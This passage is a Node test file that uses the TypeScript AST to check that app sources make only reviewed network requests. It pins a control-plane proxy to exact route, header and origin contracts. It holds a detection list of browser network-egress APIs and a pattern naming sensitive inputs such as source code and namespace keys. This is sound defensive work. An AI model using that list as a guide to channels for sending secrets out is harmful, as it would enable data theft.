// SPDX-License-Identifier: LicenseRef-Heel-Commercial

import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { extname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import ts from "typescript";


const appRoot = new URL("../", import.meta.url);
const appRootPath = fileURLToPath(appRoot);
const browserSourceRoots = ["app", "components", "lib", "workers", "worker"];
const excludedDirectories = new Set([
  ".next", ".vinext", ".wrangler", "coverage", "dist", "generated",
  "node_modules", "out", "public", "tests", "vendor",
]);
const sourceExtensions = new Set([".js", ".jsx", ".mjs", ".ts", ".tsx"]);


async function source(path) {
  return readFile(new URL(path, appRoot), "utf8");
}


async function discoverOriginalSources(rootPath, roots = browserSourceRoots) {
  const files = [];
  async function walk(directory) {
    let entries;
    try {
      entries = await readdir(directory, { withFileTypes: true });
    } catch (error) {
      if (error?.code === "ENOENT") return;
      throw error;
    }
    for (const entry of entries) {
      if (entry.isDirectory() && excludedDirectories.has(entry.name)) continue;
      const path = join(directory, entry.name);
      if (entry.isDirectory()) await walk(path);
      else if (
        sourceExtensions.has(extname(entry.name))
        && !/\.(?:test|spec)\.[cm]?[jt]sx?$/.test(entry.name)
      ) files.push(path);
    }
  }
  for (const root of roots) await walk(join(rootPath, root));
  return files.sort();
}


function constantString(node) {
  if (ts.isStringLiteralLike(node)) return node.text;
  if (ts.isParenthesizedExpression(node)) return constantString(node.expression);
  if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.PlusToken) {
    const left = constantString(node.left);
    const right = constantString(node.right);
    return left === null || right === null ? null : left + right;
  }
  return null;
}


function memberName(node) {
  if (ts.isIdentifier(node)) return node.text;
  if (ts.isPropertyAccessExpression(node)) return node.name.text;
  if (ts.isElementAccessExpression(node) && node.argumentExpression) {
    return constantString(node.argumentExpression);
  }
  return null;
}


function rootName(node) {
  let current = node;
  while (ts.isPropertyAccessExpression(current) || ts.isElementAccessExpression(current)) {
    current = current.expression;
  }
  return ts.isIdentifier(current) ? current.text : null;
}


function enclosingFunctionName(node) {
  let current = node.parent;
  while (current) {
    if (ts.isFunctionLike(current)) {
      return ts.isFunctionDeclaration(current) && current.name ? current.name.text : null;
    }
    current = current.parent;
  }
  return null;
}


function containsSensitiveInput(node) {
  let found = false;
  function visit(current) {
    if (
      ts.isIdentifier(current)
      && /^(?:source|rawSource|answers|answersJson|answers_json|review|reviewJson|review_json|namespaceKey|namespace_key)$/.test(current.text)
    ) {
      found = true;
      return;
    }
    ts.forEachChild(current, visit);
  }
  visit(node);
  return found;
}


// Exact runtime configuration guards that must precede every private control-plane request.
const controlPlaneBindingGuard = `if (
    env.CONTROL_PLANE === undefined
    || env.CONTROL_PLANE === null
    || typeof env.CONTROL_PLANE.fetch !== "function"
  ) {
    return proxyError(503, "control plane unavailable", csp);
  }`;
const controlPlaneSecretGuard = `if (typeof env.CONTROL_PLANE_EDGE_SECRET !== "string") {
    return proxyError(503, "control plane unavailable", csp);
  }`;


function analyzeSource(fileName, text) {
  const parsed = ts.createSourceFile(
    fileName,
    text,
    ts.ScriptTarget.Latest,
    true,
    fileName.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS,
  );
  const relativeName = relative(appRootPath, fileName).replaceAll("\\", "/");
  const violations = [];
  const networkCapabilities = new Set([
    "fetch", "importScripts", "XMLHttpRequest", "WebSocket", "EventSource", "sendBeacon",
  ]);
  const ambientRoots = new Set([
    "document", "frames", "globalThis", "navigator", "parent", "self", "top", "window",
  ]);
  const runtimeAuthorityMembers = new Set([
    "contentDocument", "contentWindow", "defaultView", "ownerDocument",
  ]);
  const sinkAliases = new Set();
  const engineWorker = relativeName === "workers/heel-review.worker.ts";
  const serverWorker = relativeName === "worker/index.ts";
  const findingsControlPlaneClient = relativeName === "lib/heel-cloud-api.ts";
  const canaryControlPlaneClient = relativeName === "lib/canary-api.ts";
  const controlPlaneClient = findingsControlPlaneClient || canaryControlPlaneClient;
  const constStringInitializers = new Map();

  function collectConstStringInitializers(node) {
    if (
      ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.initializer
      && ts.isVariableDeclarationList(node.parent)
      && (node.parent.flags & ts.NodeFlags.Const) !== 0
    ) {
      const existing = constStringInitializers.get(node.name.text) ?? [];
      existing.push(node.initializer);
      constStringInitializers.set(node.name.text, existing);
    }
    ts.forEachChild(node, collectConstStringInitializers);
  }
  collectConstStringInitializers(parsed);

  function resolvedConstantStrings(node, seen = new Set()) {
    if (ts.isStringLiteralLike(node)) return new Set([node.text]);
    if (ts.isParenthesizedExpression(node)) return resolvedConstantStrings(node.expression, seen);
    if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.PlusToken) {
      const values = new Set();
      for (const left of resolvedConstantStrings(node.left, seen)) {
        for (const right of resolvedConstantStrings(node.right, seen)) {
          if (values.size < 32) values.add(left + right);
        }
      }
      return values;
    }
    if (!ts.isIdentifier(node) || seen.has(node.text)) return new Set();
    const nestedSeen = new Set(seen).add(node.text);
    const values = new Set();
    for (const initializer of constStringInitializers.get(node.text) ?? []) {
      for (const value of resolvedConstantStrings(initializer, nestedSeen)) {
        if (values.size < 32) values.add(value);
      }
    }
    return values;
  }

  function resolvedMemberNames(node) {
    if (ts.isPropertyAccessExpression(node)) return new Set([node.name.text]);
    if (ts.isElementAccessExpression(node) && node.argumentExpression) {
      return resolvedConstantStrings(node.argumentExpression);
    }
    return new Set();
  }

  function bindingPropertyNames(element) {
    const property = element.propertyName ?? element.name;
    if (ts.isComputedPropertyName(property)) return resolvedConstantStrings(property.expression);
    if (ts.isIdentifier(property) || ts.isStringLiteralLike(property)) return new Set([property.text]);
    return new Set();
  }

  function report(node, message) {
    const location = parsed.getLineAndCharacterOfPosition(node.getStart(parsed));
    violations.push(`${relativeName}:${location.line + 1}:${location.character + 1}: ${message}`);
  }

  function reviewedControlPlaneFetchCall(call) {
    if (
      !serverWorker
      || !ts.isCallExpression(call)
      || call.questionDotToken
      || call.expression.getText(parsed) !== "env.CONTROL_PLANE.fetch"
      || call.arguments.length !== 1
      || enclosingFunctionName(call) !== "proxyControlPlane"
      || !ts.isAwaitExpression(call.parent)
      || !ts.isVariableDeclaration(call.parent.parent)
      || !ts.isIdentifier(call.parent.parent.name)
      || call.parent.parent.name.text !== "response"
    ) return false;
    const request = call.arguments[0];
    return ts.isNewExpression(request)
      && request.expression.getText(parsed) === "Request"
      && request.arguments?.length === 2
      && request.arguments[0].getText(parsed) === "upstreamUrl"
      && request.arguments[1].getText(parsed) === "init";
  }

  function reviewedSameOriginFetchCall(call) {
    return controlPlaneClient
      && ts.isCallExpression(call)
      && !call.questionDotToken
      && ts.isIdentifier(call.expression)
      && call.expression.text === "fetch"
      && enclosingFunctionName(call) === (
        canaryControlPlaneClient ? "sameOriginCanaryFetch" : "sameOriginControlPlaneFetch"
      )
      && call.arguments.length === 2
      && call.arguments[0].getText(parsed) === "path"
      && call.arguments[1].getText(parsed) === "init"
      && ts.isReturnStatement(call.parent);
  }

  function allowedFetchReference(node) {
    const expression = node.getText(parsed);
    if (engineWorker && expression === "scope.fetch") {
      const bind = node.parent;
      const capture = ts.isPropertyAccessExpression(bind)
        && bind.name.text === "bind"
        ? bind.parent
        : null;
      return capture !== null
        && ts.isCallExpression(capture)
        && ts.isVariableDeclaration(capture.parent)
        && isReviewedBootstrapDeclaration(capture.parent);
    }
    if (reviewedControlPlaneCapabilityCheck(node)) return true;
    return serverWorker && ts.isCallExpression(node.parent) && node.parent.expression === node
      && (
        ["env.ASSETS.fetch", "handler.fetch"].includes(expression)
        || reviewedControlPlaneFetchCall(node.parent)
      );
  }

  // `typeof` inspects the binding capability without calling or capturing it; only the one
  // reviewed guard at the start of the proxy may do so.
  function reviewedControlPlaneCapabilityCheck(node) {
    if (
      !serverWorker
      || node.getText(parsed) !== "env.CONTROL_PLANE.fetch"
      || !ts.isTypeOfExpression(node.parent)
      || enclosingFunctionName(node) !== "proxyControlPlane"
    ) return false;
    const guard = enclosingFunctionDeclaration(node)?.body?.statements[0];
    return guard !== undefined
      && ts.isIfStatement(guard)
      && guard.getText(parsed) === controlPlaneBindingGuard
      && node.getStart(parsed) >= guard.expression.getStart(parsed)
      && node.getEnd() <= guard.expression.getEnd();
  }

  function allowedFetchCall(node) {
    const expression = node.expression.getText(parsed);
    if (serverWorker && ["env.ASSETS.fetch", "handler.fetch"].includes(expression)) return true;
    if (reviewedControlPlaneFetchCall(node)) return true;
    if (reviewedSameOriginFetchCall(node)) return true;
    return engineWorker && expression === "fetcher" && isReviewedFetcherCall(node);
  }

  function validateControlPlaneClientContract() {
    if (!controlPlaneClient) return;
    const sourceText = parsed.getFullText();
    const fetchContract = canaryControlPlaneClient
      ? "async function sameOriginCanaryFetch(path: string, init: RequestInit): Promise<Response> {\n  return fetch(path, init);\n}"
      : "async function sameOriginControlPlaneFetch(path: string, init: RequestInit): Promise<Response> {\n  return fetch(path, init);\n}";
    for (const fragment of [
      'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
      fetchContract,
      'if (!path.startsWith(`${CONTROL_PLANE_PREFIX}/v1/`) || path.includes("?") || path.includes("#"))',
      'cache: "no-store",',
      'credentials: "same-origin",',
      'redirect: "error",',
    ]) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `control-plane client is missing exact ${fragment}`);
      }
    }
  }

  function validateControlPlaneProxyContract() {
    const sourceText = parsed.getFullText();
    if (!serverWorker || !sourceText.includes("CONTROL_PLANE")) return;
    const routeContract = `function controlPlaneRoute(method: string, pathname: string): string | null {
  if (pathname !== CONTROL_PLANE_PREFIX && !pathname.startsWith(\`\${CONTROL_PLANE_PREFIX}/\`)) {
    return null;
  }
  const upstreamPath = pathname.slice(CONTROL_PLANE_PREFIX.length);
  if ((upstreamPath === SIGNUP_ROUTE || upstreamPath === LOGIN_ROUTE || upstreamPath === LOGOUT_ROUTE)
    && method === "POST") return upstreamPath;
  if (upstreamPath === ME_ROUTE && method === "GET") return upstreamPath;
  if (
    (PUBLIC_DEVICE_ROUTES.has(upstreamPath) || upstreamPath === DEVICE_VERIFY_ROUTE)
    && method === "POST"
  ) return upstreamPath;
  if ((upstreamPath === RUNNER_PAIRING_EXCHANGE || RUNNER_PAIRING_ACTIVATE.test(upstreamPath) || RUNNER_ROTATION_PUBLIC.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (RUNNER_PAIRING_MANAGE.test(upstreamPath) && (method === "GET" || method === "POST" || method === "DELETE")) return upstreamPath;
  if ((RUNNER_ROTATION_START.test(upstreamPath) || RUNNER_ROTATION_APPROVE.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (RUNNER_REVOKE.test(upstreamPath) && method === "POST") return upstreamPath;
  if ((RUNNER_CONTROL.test(upstreamPath) || RUNNER_CONTEXT_CONTROL.test(upstreamPath) || RUNNER_RESULT_PROJECTION.test(upstreamPath) || RUNNER_RESYNC.test(upstreamPath)) && method === "POST") return upstreamPath;
  if (isHumanCanaryRoute(method, upstreamPath) || isHumanEnvironmentRoute(method, upstreamPath)) return upstreamPath;
  if (PROJECTS_ROUTE.test(upstreamPath) && (method === "GET" || method === "POST")) {
    return upstreamPath;
  }
  if (PROJECT_KEY_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  if (FINDINGS_APPROVAL_ROUTE.test(upstreamPath) && method === "POST") return upstreamPath;
  if (FINDINGS_SYNC_ROUTE.test(upstreamPath) && method === "POST") return upstreamPath;
  if (REVIEWS_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  if (REVIEW_DETAIL_ROUTE.test(upstreamPath) && method === "GET") return upstreamPath;
  return "";
}`;
    if (sourceText.split(routeContract).length - 1 !== 1) {
      report(parsed, "control-plane route allowlist is not the reviewed exact contract");
    }
    for (const fragment of [
      'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
      'import { canonicalPublicOrigin } from "../build/deployment-config";',
      "const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
      'if (controlPlaneOrigin === null) return proxyError(503, "control plane unavailable", csp);',
      'const SIGNUP_ROUTE = "/v1/signup";',
      'const LOGIN_ROUTE = "/v1/login";',
      'const LOGOUT_ROUTE = "/v1/logout";',
      'const ME_ROUTE = "/v1/me";',
      'const DEVICE_START_ROUTE = "/v1/device/start";',
      'const DEVICE_VERIFY_ROUTE = "/v1/device/verify";',
      'const DEVICE_POLL_ROUTE = "/v1/device/poll";',
      'const DEVICE_TOKEN_ROUTE = "/v1/device/token";',
      'const DEVICE_REFRESH_ROUTE = "/v1/device/refresh";',
      'const DEVICE_REVOKE_ROUTE = "/v1/device/revoke";',
      `const PUBLIC_DEVICE_ROUTES = new Set([
  DEVICE_START_ROUTE,
  DEVICE_POLL_ROUTE,
  DEVICE_TOKEN_ROUTE,
  DEVICE_REFRESH_ROUTE,
  DEVICE_REVOKE_ROUTE,
]);`,
      'const WORKSPACE_REF = "ws_[0-9a-f]{16}";',
      'const PROJECT_REF = "prj_[0-9a-f]{32}";',
      'const SYNCED_REVIEW_REF = "synrev_[0-9a-f]{32}";',
      'const MAX_RUNNER_CLAIM_BODY_BYTES = 256;',
      'const MAX_RUNNER_CONTROL_BODY_BYTES = 36 * 1024;',
      'const MAX_RUNNER_RESULT_PROJECTION_BODY_BYTES = 272 * 1024;',
      'const MAX_RUNNER_RESYNC_BODY_BYTES = 2 * 1024;',
      'const MAX_RUNNER_PAIRING_BODY_BYTES = 16 * 1024;',
      "const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);",
      "headers: requestContract.headers,",
      'redirect: "manual",',
      "request.body!.pipeThrough(new FixedLengthStream(requestContract.contentLength))",
      "if (response.status >= 300 && response.status <= 399)",
      '`__Host-heel_session=${match[1]}; HttpOnly; SameSite=Lax; Path=/; Secure`',
      '"__Host-heel_session=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax; Secure"',
      'if (requestUrl.search !== "") return proxyError(400, "invalid control plane request", csp);',
      'if (upstreamPath === "") return proxyError(404, "not found", csp);',
      "return proxyControlPlane(request, env, csp, upstreamPath);",
    ]) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `control-plane proxy is missing exact ${fragment}`);
      }
    }
    if (!sourceText.includes(
      "function controlPlaneCredentials(source: Headers): Headers {\n  const headers = new Headers();",
    ) || !sourceText.includes(
      'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
    )) {
      report(parsed, "control-plane request/response header allowlists are not the reviewed exact contract");
    }
    if (
      sourceText.split(
        'for (const name of ["Content-Type", "Content-Length", "Retry-After"])',
      ).length - 1 !== 1
    ) {
      report(parsed, "control-plane response header allowlist is not the reviewed exact contract");
    }
    validateControlPlaneDestinationDataflow();
  }

  // The private binding destination is only the configured PUBLIC_ORIGIN after the shared
  // canonical validator accepts it; no caller, fixed or substitute origin may reach the URL.
  function validateControlPlaneDestinationDataflow() {
    const imports = parsed.statements.filter((statement) => (
      ts.isImportDeclaration(statement)
      && ts.isStringLiteral(statement.moduleSpecifier)
      && statement.moduleSpecifier.text === "../build/deployment-config"
    ));
    const clause = imports.length === 1 ? imports[0].importClause : undefined;
    const named = clause?.namedBindings;
    if (
      !clause || clause.isTypeOnly || clause.name || !named || !ts.isNamedImports(named)
      || named.elements.length !== 1 || named.elements[0].propertyName
      || named.elements[0].isTypeOnly || named.elements[0].name.text !== "canonicalPublicOrigin"
    ) report(parsed, "control-plane destination validator is not the shared canonical import");
    const declarations = { canonicalPublicOrigin: [], controlPlaneOrigin: [], upstreamUrl: [] };
    const references = [];
    let configuredOriginReads = 0;
    let refusal = null;
    let fetchCall = null;
    function visit(node) {
      if (
        (ts.isVariableDeclaration(node) || ts.isParameter(node) || ts.isBindingElement(node)
          || ts.isFunctionDeclaration(node) || ts.isClassDeclaration(node) || ts.isImportSpecifier(node))
        && node.name && ts.isIdentifier(node.name) && Object.hasOwn(declarations, node.name.text)
      ) declarations[node.name.text].push(node);
      if (ts.isIdentifier(node) && node.text === "controlPlaneOrigin") references.push(node);
      if (
        (ts.isPropertyAccessExpression(node) && node.name.text === "PUBLIC_ORIGIN")
        || (ts.isElementAccessExpression(node) && resolvedMemberNames(node).has("PUBLIC_ORIGIN"))
      ) configuredOriginReads += 1;
      if (
        ts.isIfStatement(node)
        && node.getText(parsed) === 'if (controlPlaneOrigin === null) return proxyError(503, "control plane unavailable", csp);'
      ) refusal = node;
      if (ts.isCallExpression(node) && reviewedControlPlaneFetchCall(node)) fetchCall = node;
      if (
        (ts.isStringLiteralLike(node) || ts.isTemplateHead(node) || ts.isTemplateMiddle(node) || ts.isTemplateTail(node))
        && /\.internal\b|heel-control-plane/i.test(node.text)
      ) report(node, "control-plane destination uses a fixed private hostname");
      ts.forEachChild(node, visit);
    }
    visit(parsed);
    const origin = declarations.controlPlaneOrigin[0];
    const proxy = origin === undefined ? null : enclosingFunctionDeclaration(origin);
    const body = proxy?.body?.statements ?? [];
    const originStatement = origin?.parent?.parent;
    if (
      declarations.canonicalPublicOrigin.length !== 1
      || !ts.isImportSpecifier(declarations.canonicalPublicOrigin[0])
      || declarations.controlPlaneOrigin.length !== 1
      || !ts.isVariableDeclaration(origin)
      || (origin.parent.flags & ts.NodeFlags.Const) === 0
      || proxy?.name?.text !== "proxyControlPlane"
      || !body.includes(originStatement)
      || !origin.initializer
      || !ts.isCallExpression(origin.initializer)
      || origin.initializer.questionDotToken
      || !ts.isIdentifier(origin.initializer.expression)
      || origin.initializer.expression.text !== "canonicalPublicOrigin"
      || origin.initializer.arguments.length !== 1
      || origin.initializer.arguments[0].getText(parsed) !== "env.PUBLIC_ORIGIN"
      || configuredOriginReads !== 1
    ) report(parsed, "control-plane destination is not the validated configured origin");
    const upstream = declarations.upstreamUrl[0];
    if (
      declarations.upstreamUrl.length !== 1
      || !ts.isVariableDeclaration(upstream)
      || (upstream.parent.flags & ts.NodeFlags.Const) === 0
      || enclosingFunctionName(upstream) !== "proxyControlPlane"
      || !upstream.initializer
      || !ts.isNewExpression(upstream.initializer)
      || upstream.initializer.expression.getText(parsed) !== "URL"
      || upstream.initializer.arguments?.length !== 2
      || !ts.isIdentifier(upstream.initializer.arguments[0])
      || upstream.initializer.arguments[0].text !== "upstreamPath"
      || !ts.isIdentifier(upstream.initializer.arguments[1])
      || upstream.initializer.arguments[1].text !== "controlPlaneOrigin"
    ) report(parsed, "control-plane destination URL is not built only from the validated configured origin");
    if (
      refusal === null
      || !body.includes(refusal)
      || originStatement === undefined
      || body.indexOf(refusal) !== body.indexOf(originStatement) + 1
      || fetchCall === null
      || refusal.getEnd() > fetchCall.getStart(parsed)
      || (upstream !== undefined && refusal.getEnd() > upstream.getStart(parsed))
    ) report(parsed, "control-plane destination refusal does not precede every private fetch");
    for (const reference of references) {
      if (enclosingFunctionName(reference) !== "proxyControlPlane") {
        report(reference, "control-plane destination escapes the reviewed proxy");
      }
    }
    validateControlPlaneSinkDataflow(fetchCall);
    validateControlPlaneConfigurationGuards();
  }

  function isWriteTarget(node) {
    let current = node;
    let parent = node.parent;
    while (
      parent
      && (
        ts.isParenthesizedExpression(parent) || ts.isArrayLiteralExpression(parent)
        || ts.isObjectLiteralExpression(parent) || ts.isSpreadElement(parent)
        || ts.isSpreadAssignment(parent) || ts.isShorthandPropertyAssignment(parent)
        || (ts.isPropertyAssignment(parent) && parent.initializer === current)
      )
    ) {
      current = parent;
      parent = parent.parent;
    }
    if (!parent) return false;
    if (
      ts.isBinaryExpression(parent)
      && parent.left === current
      && parent.operatorToken.kind >= ts.SyntaxKind.FirstAssignment
      && parent.operatorToken.kind <= ts.SyntaxKind.LastAssignment
    ) return true;
    if (
      (ts.isPrefixUnaryExpression(parent) || ts.isPostfixUnaryExpression(parent))
      && [ts.SyntaxKind.PlusPlusToken, ts.SyntaxKind.MinusMinusToken].includes(parent.operator)
    ) return true;
    return ts.isDeleteExpression(parent)
      || ((ts.isForOfStatement(parent) || ts.isForInStatement(parent)) && parent.initializer === current);
  }

  function isBindingDeclarationName(node) {
    const parent = node.parent;
    return (
      ts.isVariableDeclaration(parent) || ts.isParameter(parent) || ts.isBindingElement(parent)
      || ts.isFunctionDeclaration(parent) || ts.isClassDeclaration(parent) || ts.isImportSpecifier(parent)
      || ts.isImportClause(parent) || ts.isNamespaceImport(parent)
    ) && parent.name === node;
  }

  // A const declaration does not freeze the URL or options object it names. Every reference to a
  // value that reaches the private fetch must be one reviewed construction, framing or sink use, so
  // member writes, aliases, call escapes and option overrides are refused wherever they occur.
  function validateControlPlaneSinkDataflow(fetchCall) {
    const proxy = parsed.statements.find((statement) => (
      ts.isFunctionDeclaration(statement) && statement.name?.text === "proxyControlPlane"
    ));
    const body = proxy?.body?.statements ?? [];
    const sinkRequest = fetchCall?.arguments[0];
    const sinkUrl = sinkRequest?.arguments?.[0];
    const sinkInit = sinkRequest?.arguments?.[1];
    const declarations = { upstreamUrl: [], init: [], requestContract: [] };
    const references = { upstreamUrl: [], init: [], requestContract: [] };
    const routePathWrites = [];
    function visit(node) {
      if (ts.isIdentifier(node) && Object.hasOwn(references, node.text)) {
        if (isBindingDeclarationName(node)) declarations[node.text].push(node.parent);
        else if (isRuntimeIdentifierReference(node)) references[node.text].push(node);
      }
      if (
        ts.isIdentifier(node)
        && node.text === "upstreamPath"
        && proxy !== undefined
        && node.getStart(parsed) >= proxy.getStart(parsed)
        && node.getEnd() <= proxy.getEnd()
        && node !== proxy.parameters[3]?.name
        && (isBindingDeclarationName(node) || (isRuntimeIdentifierReference(node) && isWriteTarget(node)))
      ) routePathWrites.push(node);
      ts.forEachChild(node, visit);
    }
    visit(parsed);
    const inProxyBeforeSink = (node) => proxy !== undefined
      && fetchCall !== null
      && enclosingFunctionDeclaration(node) === proxy
      && node.getEnd() <= fetchCall.getStart(parsed);
    const topLevelDeclaration = (name, flag) => {
      const declaration = declarations[name][0];
      return declarations[name].length === 1
        && ts.isVariableDeclaration(declaration)
        && ts.isVariableDeclarationList(declaration.parent)
        && (declaration.parent.flags & flag) !== 0
        && body.includes(declaration.parent.parent);
    };
    function reviewedStatementWrite(reference, texts) {
      const member = reference.parent;
      const assignment = member?.parent;
      return ts.isPropertyAccessExpression(member)
        && member.expression === reference
        && ts.isBinaryExpression(assignment)
        && assignment.left === member
        && assignment.operatorToken.kind === ts.SyntaxKind.EqualsToken
        && ts.isExpressionStatement(assignment.parent)
        && texts.delete(assignment.parent.getText(parsed))
        && inProxyBeforeSink(reference);
    }

    const destinationEscapes = references.upstreamUrl.filter((reference) => reference !== sinkUrl);
    if (
      !topLevelDeclaration("upstreamUrl", ts.NodeFlags.Const)
      || references.upstreamUrl.length !== 1
      || destinationEscapes.length !== 0
    ) {
      report(
        destinationEscapes[0] ?? parsed,
        "control-plane destination URL is mutated, aliased or escapes before the private fetch",
      );
    }

    const initDeclaration = declarations.init[0];
    const literal = initDeclaration?.initializer;
    const reviewedLiteral = topLevelDeclaration("init", ts.NodeFlags.Const)
      && initDeclaration.type?.getText(parsed) === 'RequestInit & { duplex?: "half" }'
      && literal !== undefined
      && ts.isObjectLiteralExpression(literal)
      && literal.properties.length === 3
      && ["headers: requestContract.headers", "method: request.method", 'redirect: "manual"'].every(
        (expected, index) => ts.isPropertyAssignment(literal.properties[index])
          && literal.properties[index].getText(parsed) === expected,
      );
    const reviewedInitWrites = new Set([
      `init.body = requestContract.contentLength === 0
        ? new Uint8Array()
        : request.body!.pipeThrough(new FixedLengthStream(requestContract.contentLength));`,
      'init.duplex = "half";',
    ]);
    const optionEscapes = references.init.filter((reference) => (
      reference !== sinkInit && !reviewedStatementWrite(reference, reviewedInitWrites)
    ));
    if (!reviewedLiteral || references.init.length !== 3 || optionEscapes.length !== 0) {
      report(
        optionEscapes[0] ?? parsed,
        "control-plane request options are overridden, aliased or escape before the private fetch",
      );
    }

    const reviewedContractAssignment = new Set([`requestContract = controlPlaneRequestHeaders(
      request.headers,
      request.method,
      upstreamPath,
      controlPlaneOrigin,
      edgeClientKey,
      edgeAuthSecret,
    );`]);
    const headersValue = reviewedLiteral ? literal.properties[0].initializer : null;
    const contractEscapes = references.requestContract.filter((reference) => {
      const parent = reference.parent;
      if (ts.isBinaryExpression(parent) && parent.left === reference) {
        return !(
          parent.operatorToken.kind === ts.SyntaxKind.EqualsToken
          && ts.isExpressionStatement(parent.parent)
          && reviewedContractAssignment.delete(parent.parent.getText(parsed))
          && inProxyBeforeSink(reference)
        );
      }
      if (parent === headersValue) return false;
      return !(
        ts.isPropertyAccessExpression(parent)
        && parent.expression === reference
        && parent.name.text === "contentLength"
        && !isWriteTarget(parent)
        && inProxyBeforeSink(reference)
      );
    });
    const contractDeclaration = declarations.requestContract[0];
    if (
      !topLevelDeclaration("requestContract", ts.NodeFlags.Let)
      || contractDeclaration.initializer !== undefined
      || reviewedContractAssignment.size !== 0
      || headersValue === null
      || contractEscapes.length !== 0
    ) {
      report(
        contractEscapes[0] ?? parsed,
        "control-plane request contract is overridden, aliased or escapes before the private fetch",
      );
    }

    for (const write of routePathWrites) {
      report(write, "control-plane route path is reassigned before the private fetch");
    }
  }

  // Malformed runtime configuration is unavailable (fixed 503), never an attempted private request.
  function validateControlPlaneConfigurationGuards() {
    const proxy = parsed.statements.find((statement) => (
      ts.isFunctionDeclaration(statement) && statement.name?.text === "proxyControlPlane"
    ));
    const body = proxy?.body?.statements ?? [];
    if (body.length === 0 || body[0].getText(parsed) !== controlPlaneBindingGuard) {
      report(proxy ?? parsed, "control-plane binding capability is not validated before use");
    }
    let secretReads = 0;
    function visit(node) {
      if (ts.isPropertyAccessExpression(node) && node.name.text === "CONTROL_PLANE_EDGE_SECRET") secretReads += 1;
      if (ts.isElementAccessExpression(node) && resolvedMemberNames(node).has("CONTROL_PLANE_EDGE_SECRET")) {
        secretReads += 1;
      }
      ts.forEachChild(node, visit);
    }
    visit(parsed);
    const secretIndex = body.findIndex((statement) => (
      statement.getText(parsed) === "const edgeAuthSecret = env.CONTROL_PLANE_EDGE_SECRET.trim();"
    ));
    if (
      secretIndex < 1
      || body[secretIndex - 1].getText(parsed) !== controlPlaneSecretGuard
      || secretReads !== 2
    ) report(proxy ?? parsed, "control-plane edge secret type is not validated before use");
  }

  function isReviewedBootstrapDeclaration(declaration) {
    if (
      !ts.isIdentifier(declaration.name)
      || declaration.name.text !== "bootstrapFetch"
      || declaration.type?.getText(parsed) !== "typeof fetch | null"
      || !ts.isVariableDeclarationList(declaration.parent)
      || (declaration.parent.flags & ts.NodeFlags.Let) === 0
      || (declaration.parent.flags & ts.NodeFlags.Const) !== 0
    ) return false;
    const capture = declaration.initializer;
    if (!capture || !ts.isCallExpression(capture) || capture.questionDotToken) return false;
    const bind = capture.expression;
    if (!ts.isPropertyAccessExpression(bind) || bind.name.text !== "bind") return false;
    const fetchMember = bind.expression;
    return ts.isPropertyAccessExpression(fetchMember)
      && ts.isIdentifier(fetchMember.expression)
      && fetchMember.expression.text === "scope"
      && fetchMember.name.text === "fetch"
      && capture.arguments.length === 1
      && ts.isIdentifier(capture.arguments[0])
      && capture.arguments[0].text === "scope";
  }

  function enclosingFunctionDeclaration(node) {
    let current = node.parent;
    while (current) {
      if (ts.isFunctionLike(current)) return ts.isFunctionDeclaration(current) ? current : null;
      current = current.parent;
    }
    return null;
  }

  function isReviewedFetcherDeclaration(declaration) {
    return ts.isIdentifier(declaration.name)
      && declaration.name.text === "fetcher"
      && ts.isVariableDeclarationList(declaration.parent)
      && (declaration.parent.flags & ts.NodeFlags.Const) !== 0
      && declaration.initializer !== undefined
      && ts.isIdentifier(declaration.initializer)
      && declaration.initializer.text === "bootstrapFetch"
      && enclosingFunctionName(declaration) === "fetchLocal";
  }

  function hasReviewedPathGuards(functionNode) {
    let startsAtRuntimeRoot = false;
    let rejectsTraversal = false;
    function inspect(current) {
      if (ts.isCallExpression(current) && ts.isPropertyAccessExpression(current.expression)) {
        const owner = current.expression.expression;
        const name = current.expression.name.text;
        if (ts.isIdentifier(owner) && owner.text === "path" && current.arguments.length === 1) {
          if (
            name === "startsWith"
            && ts.isIdentifier(current.arguments[0])
            && current.arguments[0].text === "RUNTIME_ROOT"
          ) startsAtRuntimeRoot = true;
          if (
            name === "includes"
            && ts.isStringLiteralLike(current.arguments[0])
            && current.arguments[0].text === ".."
          ) rejectsTraversal = true;
        }
      }
      ts.forEachChild(current, inspect);
    }
    inspect(functionNode);
    return startsAtRuntimeRoot && rejectsTraversal;
  }

  function isReviewedFetchOptions(node) {
    if (!ts.isObjectLiteralExpression(node) || node.properties.length !== 3) return false;
    const expected = new Map([
      ["cache", "no-store"],
      ["credentials", "same-origin"],
      ["redirect", "error"],
    ]);
    for (const property of node.properties) {
      if (!ts.isPropertyAssignment(property)) return false;
      const name = ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name)
        ? property.name.text
        : null;
      if (
        name === null
        || !ts.isStringLiteralLike(property.initializer)
        || property.initializer.text !== expected.get(name)
      ) return false;
      expected.delete(name);
    }
    return expected.size === 0;
  }

  function isReviewedFetcherCall(node) {
    if (!ts.isCallExpression(node) || node.questionDotToken || node.arguments.length !== 2) return false;
    const functionNode = enclosingFunctionDeclaration(node);
    return functionNode?.name?.text === "fetchLocal"
      && functionNode.parameters.length === 1
      && ts.isIdentifier(functionNode.parameters[0].name)
      && functionNode.parameters[0].name.text === "path"
      && functionNode.parameters[0].type?.getText(parsed) === "string"
      && functionNode.type?.getText(parsed) === "Promise<Response>"
      && hasReviewedPathGuards(functionNode)
      && ts.isIdentifier(node.arguments[0])
      && node.arguments[0].text === "path"
      && isReviewedFetchOptions(node.arguments[1]);
  }

